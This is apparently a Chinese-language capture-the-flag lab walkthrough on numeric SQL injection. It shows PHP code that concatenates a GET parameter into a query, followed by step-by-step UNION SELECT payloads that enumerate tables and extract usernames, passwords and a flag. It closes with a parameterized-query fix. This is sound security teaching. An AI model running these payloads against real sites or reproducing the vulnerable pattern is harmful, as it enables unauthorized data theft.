# 数字型 SQL 注入

## 靶场：SQL 注入 Easy

### 漏洞描述

产品查询页面接收一个数字 ID 参数，直接拼接到 SQL 语句中：

```php
$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = $id";
```

由于 `$id` 没有经过任何过滤或类型转换，攻击者可以注入任意 SQL 代码。

## 攻击步骤

### 第一步：确认漏洞

访问 `?id=1`，正常返回产品信息。

访问 `?id=1'`，如果页面报错，说明参数被直接拼接到 SQL 语句中。

### 第二步：判断字段数

使用 `ORDER BY` 子句确定查询返回的字段数：

```
?id=1 ORDER BY 1   -- 正常
?id=1 ORDER BY 5   -- 正常
?id=1 ORDER BY 6   -- 报错，说明有 5 个字段
```

### 第三步：UNION 联合查询

使用 `UNION SELECT` 查询数据库信息：

```
?id=-1 UNION SELECT 1,2,3,4,5
```

注意：使用 `-1` 使原始查询不返回结果，这样只能看到 UNION 的输出。

### 第四步：获取数据库信息

```
?id=-1 UNION SELECT 1,database(),user(),version(),5
```

### 第五步：查询表名

```
?id=-1 UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema='cyberrange'
```

### 第六步：查询列名

```
?id=-1 UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'
```

### 第七步：提取数据

```
?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users
```

### 第八步：获取 Flag

```
?id=-1 UNION SELECT 1,group_concat(flag),3,4,5 FROM flags
```

## 关键知识点

- **数字型注入** — 参数是数字，不需要闭合引号
- **UNION 查询** — 合并两个查询的结果
- **information_schema** — MySQL 的元数据库，包含所有表和列的信息
- **group_concat()** — 将多行结果合并为一个字符串

## 防御代码

```php
// 正确做法：使用参数化查询
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

## 下一步

[学习字符型注入 →](./03-string-injection.md)
